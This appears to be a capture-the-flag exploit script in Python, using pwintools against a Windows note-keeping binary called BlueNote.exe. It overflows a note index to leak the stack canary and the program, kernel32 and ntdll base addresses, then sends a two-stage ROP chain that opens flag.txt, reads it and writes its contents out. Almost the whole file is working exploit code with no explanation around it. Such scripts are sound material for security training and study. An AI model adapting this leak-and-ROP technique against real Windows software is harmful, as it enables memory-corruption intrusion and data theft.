from pwintools import *
import time

def recvuntil(delim):
    msg = p.recvuntil(delim)
    print(msg)
    return msg

def add(payload):
    recvuntil('choice:')
    p.sendline('1')
    recvuntil('Data:')
    if len(payload) == 0x100:
        p.send(payload)
    else:
        p.sendline(payload)

def overadd(payload, line=True):
    recvuntil('choice:')
    p.sendline('1')
    recvuntil('Index:')
    p.sendline('5')
    recvuntil('Data:')
    if line == True:
        p.sendline(payload)
    else:
        p.send(payload)

def show(index):
    recvuntil('choice:')
    p.sendline('2')
    recvuntil('Index:')
    p.sendline(index)

def byebye():
    recvuntil('choice:')
    p.sendline('3')

def recv_mem(count):
    result = ''
    while count > 0:
        c = p.recv(1)
        count -= 1
        if c == '\x0d':
            s = p.recv(1)
            if s == '\x0a':
                # skip '\x0d'
                c = s
            else:
                result += c
                c = s
                count -= 1
        result += c
    return result

# code gadget
codeWritableArea = 0x4000

# kernel32 gadget
CreateFileA = 0x22080
ReadFile = 0x22410
WriteFile = 0x22500
GetStdHandle = 0x1c610

# ntdll gadget
xchg_eax_ecx = 0x87ebb
pop_rcx = 0x21597
pop_rdx_r11 = 0x8c4b7
pop_r891011 = 0x8c4b2
pop_rsp = 0xb416
add_rsp38 = 0x26fb

p = Process('BlueNote.exe')
# p = Remote('127.0.0.1', 30001)

add('a'*0x100)
add('b'*0x100)
add('c'*0x100)
add('d'*0x100)
add('e'*0x100)
overadd('a')

show('5')

leak = recv_mem(0x100)

log.info('len(leak): {}'.format(len(leak)))

for i in range(0, 0x100, 0x8):
    info = u64(leak[i:i+0x8])
    log.info('info[{:#x}:{:#x}]: {:#x}'.format(i, i+0x8, info))

canary = u64(leak[0x50:0x58])
code_base = u64(leak[0x60:0x68]) - 0x1734
kernel32_base = u64(leak[0xa0:0xa8]) - 0x17bd4
ntdll_base = u64(leak[0xd0:0xd8]) - 0x6ced1

log.info('canary       : {:#x}'.format(canary))
log.info('code_base    : {:#x}'.format(code_base))
log.info('kernel32_base: {:#x}'.format(kernel32_base))
log.info('ntdll_base   : {:#x}'.format(ntdll_base))

# code gadget
codeWritableArea += code_base

# kernel32 gadget
CreateFileA += kernel32_base
ReadFile += kernel32_base
WriteFile += kernel32_base
GetStdHandle += kernel32_base

# ntdll gadget
xchg_eax_ecx += ntdll_base
pop_rcx += ntdll_base
pop_rdx_r11 += ntdll_base
pop_r891011 += ntdll_base
pop_rsp += ntdll_base
add_rsp38 += ntdll_base

rbp_offset = 0xa00
p2_offset = 0xc00
p2_space = 0x300
fn_offset = 0x2a0
fn_space = 0x10
buf_offset = p2_offset + p2_space
buf_space = 0x100

log.info('payload2: {:#x}'.format(codeWritableArea + p2_offset))

payload = 'a' * 0x50
payload += leak[0x50:0x58]
payload += p64(codeWritableArea + rbp_offset)
payload += p64(pop_rcx) + p64(0xFFFFFFF6)
payload += p64(GetStdHandle)
payload += p64(xchg_eax_ecx)
payload += p64(pop_rdx_r11) + p64(codeWritableArea + p2_offset) + p64(0)
payload += p64(pop_r891011) + p64(p2_space) + p64(codeWritableArea + rbp_offset - 4) + p64(0) + p64(0)
payload += p64(ReadFile)
payload += p64(pop_rsp) + p64(codeWritableArea + p2_offset)
if len(payload) > 0x100:
    print('payload is too large: need to simplify payload')
    exit()
payload = payload.ljust(0x100, '\0')
overadd(payload, line=False)

byebye()

time.sleep(0.5)
payload = p64(pop_rcx) + p64(codeWritableArea + p2_offset + fn_offset)
payload += p64(pop_rdx_r11) + p64(0x80000000) + p64(0)
payload += p64(pop_r891011) + p64(1) + p64(0) + p64(0) + p64(0)
payload += p64(CreateFileA)
payload += p64(add_rsp38) + p64(0) + p64(0) + p64(0) + p64(0) + p64(3) + p64(0x80) + p64(0)
payload += p64(xchg_eax_ecx)
payload += p64(pop_rdx_r11) + p64(codeWritableArea + buf_offset) + p64(0)
payload += p64(pop_r891011) + p64(buf_space) + p64(codeWritableArea + rbp_offset - 4) + p64(0) + p64(0)
payload += p64(ReadFile)
payload += p64(add_rsp38) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
payload += p64(pop_rcx) + p64(0xFFFFFFF5)
payload += p64(GetStdHandle)
payload += p64(xchg_eax_ecx)
payload += p64(pop_rdx_r11) + p64(codeWritableArea + buf_offset) + p64(0)
payload += p64(pop_r891011) + p64(buf_space) + p64(codeWritableArea + rbp_offset - 4) + p64(0) + p64(0)
payload += p64(WriteFile)
payload += p64(add_rsp38) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
if len(payload) > fn_offset:
    print('fn_offset needs to be larger')
    print('{} > {}'.format(len(payload), fn_offset))
    exit()
payload = payload.ljust(fn_offset, '\0')
payload += 'flag.txt\0'.ljust(fn_space, '\0')
if len(payload) > p2_space:
    print('payload2 needs larger space')
    exit()
payload = payload.ljust(p2_space, '\0')
p.send(payload)

p.interactive()